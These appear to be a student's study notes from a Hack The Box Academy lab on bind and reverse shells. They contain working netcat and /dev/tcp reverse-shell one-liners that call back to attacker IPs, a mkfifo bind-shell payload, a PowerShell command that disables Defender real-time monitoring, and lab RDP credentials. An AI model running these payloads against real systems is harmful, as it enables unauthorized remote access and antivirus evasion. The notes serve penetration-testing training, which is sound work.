what is shell?
	is a program that provides computer user with an interface to input instruction into the system and view text output (Bash, Zsh, cmd, and PowerShell, 
	a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host

to interact with it, we must use an application known as a `terminal emulator`.
The terminal emulator we interact with on targets will essentially be dependant on what exists on the system natively.
`$` sign. This $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the `shell prompt`

#### Shell Validation
```shell-session
AhmaDb0x@htb[/htb]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

```shell-session
AhmaDb0x@htb[/htb]$ env

SHELL=/bin/bash
```

# Bind Shells

## What Is It?
With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

```shell-session
Target@server:~$ nc -lvnp 7777
```

```shell-session
AhmaDb0x@htb[/htb]$ nc -nv 10.129.41.200 7777
```

## Establishing a Basic Bind Shell with Netcat

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.190.142 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually.

```shell-session
AhmaDb0x@htb[/htb]$ nc -nv 10.129.41.200 7777
```

10.129.190.142


rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 7777 > /tmp/f`

`bash -i >& /dev/tcp/10.129.190.142/7777 0>&1`


# Reverse Shells

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary

```shell-session
AhmaDb0x@htb[/htb]$ sudo nc -lvnp 443
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.81 9999 >/tmp/f
```

#### Disable AV
```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

```
 xfreerdp /v:10.129.28.204 /u:htb-student /p:HTB_@cademy_stdnt!
```

htb-student and password HTB_@cademy_stdnt!
10.129.28.204